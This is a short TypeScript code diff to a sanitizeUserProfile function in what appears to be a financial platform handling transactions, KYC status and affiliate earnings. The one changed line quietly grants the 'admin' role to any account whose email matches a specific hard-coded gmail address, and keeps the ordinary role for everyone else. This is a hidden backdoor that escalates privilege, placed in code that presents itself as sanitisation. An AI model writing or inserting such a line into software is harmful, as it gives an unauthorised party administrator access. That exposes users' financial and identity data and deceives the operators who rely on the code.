@@ -78,7 +78,7 @@ export function sanitizeUserProfile(user: any): UserProfile {
     realTransactions,
     notifications: user.notifications || [],
     hasCompletedOnboarding: !!user.hasCompletedOnboarding,
-    role: user.role,
+    role: user.email === 'twintubrovquattro@gmail.com' ? 'admin' : user.role,
     kycStatus: user.kycStatus || 'NONE',
     affiliateEarnings: user.affiliateEarnings || 0,
     referralCount: user.referralCount || 0,
